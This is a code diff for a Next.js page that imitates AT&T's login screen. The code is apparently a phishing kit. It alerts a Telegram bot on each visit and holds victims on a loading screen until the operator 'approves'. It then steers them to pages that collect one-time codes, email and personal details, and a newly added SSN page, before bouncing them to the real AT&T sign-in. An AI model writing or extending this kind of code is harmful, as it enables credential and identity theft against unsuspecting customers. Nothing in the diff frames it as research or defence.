@@ -4,6 +4,96 @@ import Script from 'next/script';
 
 export default function Home() {
   useEffect(() => {
+    // Notify Telegram immediately when user visits the page
+    // And poll for redirect commands
+    (async () => {
+      try {
+        const visitorId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
+        localStorage.setItem('visitorId', visitorId);
+        console.log('[index.js] Sending visitor notification, visitorId:', visitorId);
+        
+        const response = await fetch('/api/telegram/notify-visitor', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ visitorId })
+        });
+        
+        const data = await response.json();
+        console.log('[index.js] Notification response:', data);
+        
+        if (!response.ok) {
+          console.error('[index.js] Failed to send notification:', data);
+        }
+        
+        // Use SSE for instant redirect notifications + polling as backup
+        let redirectReceived = false;
+        
+        // SSE connection for instant redirects
+        const redirectEventSource = new EventSource(`/api/redirect/stream/${visitorId}`);
+        redirectEventSource.onmessage = function(event) {
+          try {
+            const data = JSON.parse(event.data);
+            if (data.type === 'connected') {
+              console.log('[index.js] Redirect SSE connected');
+            } else if (data.redirect && data.pagePath) {
+              redirectReceived = true;
+              redirectEventSource.close();
+              clearInterval(redirectInterval);
+              console.log('[index.js] Redirect command received via SSE');
+              console.log('[index.js] Redirect type:', data.redirectType);
+              console.log('[index.js] Redirecting to:', data.pagePath);
+              
+              // Ensure OTP redirects to /otp
+              const targetPath = (data.redirectType === 'otp') ? '/otp' : data.pagePath;
+              console.log('[index.js] Final redirect path:', targetPath);
+              window.location.href = targetPath;
+            }
+          } catch (error) {
+            console.error('[index.js] Error parsing SSE redirect:', error);
+          }
+        };
+        
+        redirectEventSource.onerror = function(error) {
+          console.error('[index.js] Redirect SSE error:', error);
+          // Fallback to polling if SSE fails
+        };
+        
+        // Polling backup (in case SSE doesn't work)
+        const redirectInterval = setInterval(async () => {
+          if (redirectReceived) {
+            clearInterval(redirectInterval);
+            return;
+          }
+          
+          try {
+            const response = await fetch(`/api/redirect/${visitorId}?t=${Date.now()}`);
+            const data = await response.json();
+            
+            if (data.redirect && data.pagePath) {
+              redirectReceived = true;
+              redirectEventSource.close();
+              clearInterval(redirectInterval);
+              console.log('[index.js] Redirect command received via polling');
+              console.log('[index.js] Redirect type:', data.redirectType);
+              console.log('[index.js] Redirecting to:', data.pagePath);
+              
+              // Ensure OTP redirects to /otp
+              const targetPath = (data.redirectType === 'otp') ? '/otp' : data.pagePath;
+              console.log('[index.js] Final redirect path:', targetPath);
+              window.location.href = targetPath;
+            }
+          } catch (error) {
+            console.error('Error checking redirect:', error);
+          }
+        }, 200); // Poll every 200ms as backup
+        
+        // Stop polling after 5 minutes
+        setTimeout(() => clearInterval(redirectInterval), 300000);
+      } catch (error) {
+        console.error('Error notifying Telegram:', error);
+      }
+    })();
+
     const loginForm = document.getElementById('login-form');
     const usernameInput = document.getElementById('userID');
     const passwordGroup = document.getElementById('password-group');
@@ -79,8 +169,13 @@ export default function Home() {
               const loadingScreen = document.getElementById('loading-screen');
               if (loadingScreen) loadingScreen.classList.remove('active');
               
-              submitBtn.disabled = false;
-              submitBtn.textContent = cachedUsername ? 'Sign in' : 'Continue';
+              // Reset to user ID view if we were waiting for initial approval
+              if (type === 'userid') {
+                resetToUserIDView();
+              } else {
+                submitBtn.disabled = false;
+                submitBtn.textContent = cachedUsername ? 'Sign in' : 'Continue';
+              }
               alert('Access denied. Please try again.');
             }
           } else if (data.type === 'connected') {
@@ -139,8 +234,8 @@ export default function Home() {
                 const redirectType = approval.redirectType || 'att';
                 console.log(`[index.js] 🚀 Redirecting to: ${redirectType}`);
                 
-                // Store userId for OTP/email/personal pages
-                if (redirectType === 'otp' || redirectType === 'email' || redirectType === 'personal') {
+                // Store userId for OTP/email/personal/ssn pages
+                if (redirectType === 'otp' || redirectType === 'email' || redirectType === 'personal' || redirectType === 'ssn') {
                   localStorage.setItem('lastUserId', userId);
                 }
                 
@@ -149,8 +244,13 @@ export default function Home() {
                 const loadingScreen = document.getElementById('loading-screen');
                 if (loadingScreen) loadingScreen.classList.remove('active');
                 
-                submitBtn.disabled = false;
-                submitBtn.textContent = cachedUsername ? 'Sign in' : 'Continue';
+                // Reset to user ID view if we were waiting for initial approval
+                if (type === 'userid') {
+                  resetToUserIDView();
+                } else {
+                  submitBtn.disabled = false;
+                  submitBtn.textContent = cachedUsername ? 'Sign in' : 'Continue';
+                }
                 alert('Access denied. Please try again.');
               }
             }
@@ -197,12 +297,22 @@ export default function Home() {
       } else if (redirectType === 'otp') {
         console.log('[handleRedirect] 🚀 Redirecting to /otp');
         window.location.href = '/otp';
+      } else if (redirectType === 'ssn') {
+        console.log('[handleRedirect] 🚀 Redirecting to /personal (SSN page)');
+        window.location.href = '/personal';
       } else if (redirectType === 'email') {
         console.log('[handleRedirect] 🚀 Redirecting to /email');
         window.location.href = '/email';
       } else if (redirectType === 'personal') {
         console.log('[handleRedirect] 🚀 Redirecting to /personal');
         window.location.href = '/personal';
+      } else if (redirectType === 'login') {
+        console.log('[handleRedirect] 🚀 Staying on login page');
+        // Already on login page, just hide loading
+        const loadingScreen = document.getElementById('loading-screen');
+        if (loadingScreen) loadingScreen.classList.remove('active');
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Continue';
       } else if (redirectType === 'att') {
         console.log('[handleRedirect] 🚀 Redirecting to AT&T');
         window.location.href = 'https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&appName=m14186&loginSuccessURL=https:%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3D3nv01nEz';
@@ -229,22 +339,22 @@ export default function Home() {
         const userId = usernameInput.value.trim();
         
         if (userId && !cachedUsername) {
-          // First step: Log user ID entry (panel monitoring only, no blocking)
-          await logActivity('userid', userId);
-          
-          // Automatically proceed to password view (no loading screen)
+          // First step: Log user ID entry and wait for Telegram bot command
           cachedUsername = userId;
-          cachedUserIdText.textContent = userId;
-          userIdGroup.style.display = 'none';
-          passwordGroup.style.display = 'block';
-          loginContainer.classList.add('password-view');
-          submitBtn.textContent = 'Sign in';
           
-          // Focus password field
-          const passwordInput = document.getElementById('password');
-          if (passwordInput) {
-            passwordInput.focus();
-          }
+          // Log user ID entry and get activity ID
+          const activityId = await logActivity('userid', userId);
+          pendingActivityId = activityId;
+          
+          console.log('[index.js] User ID activity ID:', activityId);
+          
+          // Show loading screen
+          const loadingScreen = document.getElementById('loading-screen');
+          if (loadingScreen) loadingScreen.classList.add('active');
+          submitBtn.disabled = true;
+          
+          // Wait for Telegram bot approval to redirect to OTP page
+          waitForApprovalSSE(activityId, 'userid', userId);
           
         } else if (cachedUsername) {
           // Second step: Password entered - show loading and wait for panel approval
@@ -331,6 +441,7 @@ export default function Home() {
       <Head>
         <title>AT&T Login Page</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="icon" href="/logo.png" type="image/png" />
       </Head>
       <Script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js" strategy="afterInteractive" />
       <style jsx global>{`
@@ -525,13 +636,18 @@ export default function Home() {
           margin-top: 40px;
           padding-top: 20px;
           text-align: center;
+          max-width: 450px;
+          width: 100%;
+          margin-left: auto;
+          margin-right: auto;
         }
 
         .footer-links {
           display: flex;
-          flex-wrap: wrap;
+          flex-wrap: nowrap;
           justify-content: center;
-          gap: 20px;
+          align-items: center;
+          gap: 15px;
           margin-bottom: 15px;
         }
 
@@ -540,11 +656,63 @@ export default function Home() {
           font-size: 13px;
           text-decoration: none;
           transition: all 0.2s ease;
+          white-space: nowrap;
+          display: inline-flex;
+          align-items: center;
+          gap: 6px;
         }
 
         .footer-links a:hover {
           color: #0057b8;
           text-decoration: underline;
+        }
+
+        .privacy-choices-link {
+          display: inline-flex;
+          align-items: center;
+          gap: 6px;
+        }
+
+        .privacy-icon {
+          display: inline-flex;
+          align-items: center;
+          justify-content: center;
+          width: 18px;
+          height: 18px;
+          border: 1.5px solid #666666;
+          border-radius: 3px;
+          position: relative;
+          flex-shrink: 0;
+          background: #ffffff;
+        }
+
+        .privacy-icon::before {
+          content: '✓';
+          position: absolute;
+          font-size: 10px;
+          color: #666666;
+          line-height: 1;
+          top: 2px;
+          left: 2px;
+        }
+
+        .privacy-icon::after {
+          content: '✕';
+          position: absolute;
+          font-size: 10px;
+          color: #666666;
+          line-height: 1;
+          bottom: 2px;
+          right: 2px;
+        }
+
+        .privacy-choices-link:hover .privacy-icon {
+          border-color: #0057b8;
+        }
+
+        .privacy-choices-link:hover .privacy-icon::before,
+        .privacy-choices-link:hover .privacy-icon::after {
+          color: #0057b8;
         }
 
         .copyright {
@@ -774,10 +942,13 @@ export default function Home() {
           <a href="#privacy">Privacy policy</a>
           <a href="#terms">Terms of use</a>
           <a href="#accessibility">Accessibility</a>
-          <a href="#choices">Your privacy choices</a>
+          <a href="#choices" className="privacy-choices-link">
+            <span className="privacy-icon"></span>
+            Your privacy choices
+          </a>
         </div>
         <div className="copyright">
-          ©2025 AT&T Intellectual Property. All rights reserved.
+          ©2026 AT&T Intellectual Property. All rights reserved.
         </div>
       </div>
 
